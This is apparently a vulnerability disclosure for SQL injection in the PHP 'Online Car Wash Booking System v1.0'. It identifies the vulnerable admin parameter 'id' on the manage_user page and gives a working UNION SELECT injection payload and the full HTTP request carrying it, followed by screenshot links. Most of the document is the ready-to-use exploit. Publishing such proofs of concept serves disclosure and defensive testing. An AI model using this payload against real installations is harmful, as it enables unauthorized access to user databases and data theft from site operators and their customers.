# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/admin/?page=user/manage_user&id=

Vulnerability location: /ocwbs/admin/?page=user/manage_user&id=, id

[+] Payload: /ocwbs/admin/?page=user/manage_user&id=-2%27%20union%20select%201,2,3,4,5,6,7,8,9,10--+ // Leak place ---> id

```sql
GET /ocwbs/admin/?page=user/manage_user&id=-2%27%20union%20select%201,2,3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/169299978-16a65086-d3be-4ec7-abf5-d8970bb4b197.png)

![image](https://user-images.githubusercontent.com/54017627/169299856-fbd37236-28f4-4f51-92b0-4acd2f97609a.png)
